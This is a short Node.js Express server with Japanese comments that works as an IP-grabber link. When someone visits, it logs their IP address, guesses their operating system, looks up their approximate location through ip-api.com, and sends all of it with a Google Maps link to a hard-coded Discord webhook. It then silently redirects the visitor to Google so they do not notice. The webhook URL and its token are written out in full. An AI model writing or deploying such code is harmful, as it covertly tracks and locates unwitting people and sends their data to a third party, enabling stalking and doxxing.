import express from 'express';
import fetch from 'node-fetch';

const app = express();
const PORT = 3000;
const webhookURL = 'https://discord.com/api/webhooks/1377252474037076099/w7U5xd5AeYq-jotDMYQZjxIoL6g02e4wdUAeMP9dYvtPDoao6EIEh-LmjcXfggoZSpSx';

// クライアントのグローバルIPを取得
function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return forwarded.split(',')[0];
  }
  return req.connection.remoteAddress || req.socket.remoteAddress || 'IP取得不可';
}

// User-Agent から OS 判別
function getDeviceType(userAgent) {
  if (!userAgent) return '不明';
  if (userAgent.includes('Windows')) return 'Windows';
  if (userAgent.includes('Macintosh')) return 'Mac';
  if (/iPhone|iPad|iPod/.test(userAgent)) return 'iOSデバイス';
  if (userAgent.includes('Android')) return 'Androidデバイス';
  if (userAgent.includes('Linux')) return 'Linux';
  return '不明';
}

app.get('/', async (req, res) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  const deviceType = getDeviceType(userAgent);

  let location = '住所情報が取得できませんでした';
  let lat = null;
  let lon = null;

  try {
    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?lang=ja`);
    const geoData = await geoResponse.json();

    if (geoData.status === 'success') {
      location = `${geoData.regionName}, ${geoData.city}`;
      lat = geoData.lat;
      lon = geoData.lon;
    }
  } catch (err) {
    console.error('住所取得エラー:', err);
  }

  const googleMapUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${lat},${lon}` : null;

  const message = {
    content: `📥 アクセスがありました！\n🔹 IP: ${ip}\n🔹 デバイス: ${deviceType}\n🔹 住所(推定): ${location}`,
    embeds: []
  };

  if (googleMapUrl) {
    message.embeds.push({
      title: 'Googleマップで表示',
      url: googleMapUrl,
      description: location,
      color: 0x00ff00
    });
  }

  try {
    const response = await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message)
    });

    const result = await response.text();
    console.log('Discordからのレスポンス:', result);

    // アクセス後 Google にリダイレクト
    res.redirect('https://www.google.co.jp');
  } catch (error) {
    console.error('Webhook送信エラー:', error);
    res.status(500).send('❌ Discord送信中にエラーが発生しました。');
  }
});

app.listen(PORT, () => {
  console.log(`🚀 サーバーが http://localhost:${PORT} で起動しました`);
});
